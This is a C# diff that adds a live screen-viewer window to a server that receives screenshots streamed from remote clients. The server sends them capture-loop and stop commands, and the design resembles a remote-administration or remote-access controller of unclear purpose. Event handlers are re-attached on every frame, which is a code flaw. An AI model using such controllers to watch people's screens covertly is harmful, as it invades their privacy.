@@ -5,6 +5,7 @@ using System.Threading.Tasks;
 using BrightIdeasSoftware;
 using LazyServer;
 using Newtonsoft.Json.Linq;
+using Sweep.Forms;
 using Sweep.Models;
 using Sweep.UI;
 
@@ -14,6 +15,7 @@ namespace Sweep.Services
     {
         private readonly LazyServerHost _server;
         private readonly ObjectListView _listView;
+        private ScreenViewer viewer;
 
         public MessageHandler(LazyServerHost server, ObjectListView listView, int port)
         {
@@ -53,7 +55,7 @@ namespace Sweep.Services
                     await HandleAliveAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                     break;
 
-                case "ssloop":
+                case "screenshot":
                     await HandleScreenshotAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                     break;
 
@@ -69,14 +71,45 @@ namespace Sweep.Services
         }
         private async Task HandleScreenshotAsync(JObject meta, string clientId, byte[] packet)
         {
+            if (viewer == null || viewer.IsDisposed)
+            {
+                System.Windows.Forms.Control ctrl = _listView; // any control created on the UI thread
+                if (ctrl.InvokeRequired)
+                {
+                    ctrl.Invoke(new Action(() =>
+                    {
+                        viewer = new ScreenViewer();
+                        viewer.Show();
+                    }));
+                }
+                else
+                {
+                    viewer = new ScreenViewer();
+                    viewer.Show();
+                }
+            }
+
+            viewer.QualityChanged += async (string quality) => {
+                await _server.SendMessageToClient(clientId, new JObject {
+                    ["command"] = "ssloop",
+                    ["quality"] = quality
+                }.ToString());
+            };
+
+            viewer.Closing += async () => {
+                await _server.SendMessageToClient(clientId, new JObject
+                {
+                    ["command"] = "stopss"
+                }.ToString());
+            };
+
             try
             {
                 Image shot;
                 using (var ms = new MemoryStream(packet))
                     shot = Image.FromStream(ms);
 
-                Console.WriteLine($"Received screenshot ({shot.Width}×{shot.Height}) from {clientId}");
-                // … your custom logic here …
+                viewer.SetScreen(shot);
             }
             catch (Exception ex)
             {
